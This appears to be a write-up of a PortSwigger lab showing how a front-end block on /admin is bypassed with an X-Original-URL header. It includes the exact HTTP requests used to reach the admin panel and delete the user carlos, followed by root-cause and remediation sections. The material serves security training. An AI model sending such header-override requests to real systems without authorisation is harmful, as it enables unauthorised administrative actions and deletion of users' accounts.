# PortSwigger Lab: URL-based Access Control Can Be Circumvented

## 📌 Lab Information

* **Platform:** PortSwigger Web Security Academy
* **Lab:** URL-based access control can be circumvented
* **Difficulty:** Practitioner
* **Vulnerability:** Broken Access Control
* **Attack Type:** URL-based Access Control Bypass
* **Tool Used:** Burp Suite
* **Status:** Solved ✅

---

## 🎯 Objective

The application contains an administrative panel at:

```text
/admin
```

Direct access to `/admin` is blocked by a front-end access-control mechanism.

The back-end application supports the:

```http
X-Original-URL
```

HTTP header.

The objective was to:

1. Bypass the front-end restriction.
2. Access the `/admin` panel.
3. Access the admin delete functionality.
4. Delete the user `carlos`.

---

## 🔍 Vulnerability Overview

The application uses two different layers to process requests:

```text
Client
  │
  ▼
Front-End Access Control
  │
  ▼
Back-End Application
```

The front-end blocks requests containing:

```text
/admin
```

However, the back-end trusts the `X-Original-URL` header to determine the requested resource.

This creates an inconsistency between the URL checked by the front-end and the URL processed by the back-end.

---

# 🧪 Testing Methodology

## Step 1 — Test Direct Access to `/admin`

First, I requested:

```http
GET /admin HTTP/2
Host: <LAB-HOST>
```

The server returned:

```http
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8

"Access denied"
```

### Observation

The direct request to `/admin` was blocked by the front-end access-control layer.

---

## Step 2 — Test `X-Original-URL`

The request was sent to **Burp Suite Repeater**.

I changed the request path from:

```http
GET /admin
```

to:

```http
GET /
```

and added:

```http
X-Original-URL: /invalid
```

The request became:

```http
GET / HTTP/2
Host: <LAB-HOST>
X-Original-URL: /invalid
```

### Observation

The application returned a `404 Not Found` response.

This indicated that the back-end was processing the value supplied through:

```http
X-Original-URL
```

Therefore, the header could potentially be used to bypass the front-end URL restriction.

---

# 🔓 Step 3 — Bypass Access Control

I changed:

```http
X-Original-URL: /invalid
```

to:

```http
X-Original-URL: /admin
```

The request became:

```http
GET / HTTP/2
Host: <LAB-HOST>
X-Original-URL: /admin
```

### Result

The front-end sees:

```text
/
```

instead of:

```text
/admin
```

Therefore, the front-end restriction is bypassed.

The back-end then processes:

```text
/admin
```

from the `X-Original-URL` header.

As a result, the admin panel becomes accessible.

---

# 🗑️ Step 4 — Delete User `carlos`

The admin functionality contains a delete endpoint:

```text
/admin/delete
```

The target username is supplied using:

```text
username=carlos
```

Instead of directly requesting the protected endpoint, I used the same URL-based access-control bypass.

The final request was:

```http
GET /?username=carlos HTTP/2
Host: <LAB-HOST>
X-Original-URL: /admin/delete
```

### Request Breakdown

```text
Actual URL:
/

X-Original-URL:
/admin/delete

Query parameter:
username=carlos
```

The front-end therefore sees:

```text
/
```

while the back-end processes:

```text
/admin/delete?username=carlos
```

---

# ✅ Result

The request successfully accessed the protected delete functionality and deleted:

```text
carlos
```

The PortSwigger lab was successfully completed.

---

# 🔬 Attack Flow

```text
                Attacker
                   │
                   ▼
        GET / HTTP/2
        X-Original-URL: /admin
                   │
                   ▼
        ┌────────────────────┐
        │ Front-End Layer    │
        │                    │
        │ Checks: /          │
        │ Result: ALLOWED    │
        └─────────┬──────────┘
                  │
                  ▼
        ┌────────────────────┐
        │ Back-End Application│
        │                    │
        │ Processes: /admin  │
        └─────────┬──────────┘
                  │
                  ▼
             Admin Panel
```

For deletion:

```text
GET /?username=carlos
X-Original-URL: /admin/delete
              │
              ▼
       Front-End sees /
              │
              ▼
            ALLOW
              │
              ▼
      Back-End processes
              │
              ▼
/admin/delete?username=carlos
              │
              ▼
       Carlos deleted
```

---

# 🧠 Root Cause

The root cause is **inconsistent URL interpretation between the front-end and back-end**.

The front-end performs authorization based on the actual request path:

```text
/
```

while the back-end uses:

```http
X-Original-URL
```

to determine the intended resource.

Because the two layers use different URL values for authorization and routing, an attacker can bypass the front-end restriction.

---

# ⚠️ Security Impact

An attacker could potentially:

* Bypass front-end URL restrictions.
* Access administrative functionality.
* Access unauthorized endpoints.
* Perform administrative actions.
* Delete or modify other users.
* Potentially escalate privileges depending on the exposed functionality.

The impact depends on which protected endpoints are reachable through the back-end routing mechanism.

---

# 🛡️ Remediation

Applications should avoid trusting client-controlled headers such as:

```http
X-Original-URL
```

for security-sensitive authorization decisions.

Recommended controls:

1. Perform authorization checks at the back-end application.
2. Ensure the front-end and back-end use the same canonicalized URL.
3. Do not trust client-supplied URL override headers.
4. Apply authentication and authorization to every administrative endpoint.
5. Validate and normalize URLs consistently.
6. Restrict access to administrative functionality using server-side authorization.
7. Test reverse-proxy and framework URL handling during security assessments.

---

# 🧰 Tools Used

| Tool                             | Purpose                                    |
| -------------------------------- | ------------------------------------------ |
| Burp Suite                       | HTTP request interception and modification |
| Burp Repeater                    | Testing modified HTTP requests             |
| Browser                          | Accessing the PortSwigger lab              |
| PortSwigger Web Security Academy | Vulnerable training environment            |

---

<img width="1280" height="662" alt="image" src="https://github.com/user-attachments/assets/bf4bf08a-4f81-4aaa-b979-313792be08bc" />
<img width="1866" height="968" alt="image" src="https://github.com/user-attachments/assets/deb2f923-4d86-46b0-b960-c2a967811acf" />
<img width="1919" height="834" alt="image" src="https://github.com/user-attachments/assets/ae99f004-c190-4358-bb5c-2afb61f1e0c7" />
<img width="1485" height="492" alt="image" src="https://github.com/user-attachments/assets/1cbc001a-5e81-4f3b-ab23-054c0d3b3ab0" />
<img width="1918" height="737" alt="image" src="https://github.com/user-attachments/assets/75444a78-21c2-49f9-9170-09757a5a8903" />
<img width="1918" height="737" alt="image" src="https://github.com/user-attachments/assets/49313635-1648-4007-b019-0b8621f6ce7d" />
<img width="1919" height="874" alt="image" src="https://github.com/user-attachments/assets/2cc40b29-d8c2-45d8-886a-15c86f10f4fc" />


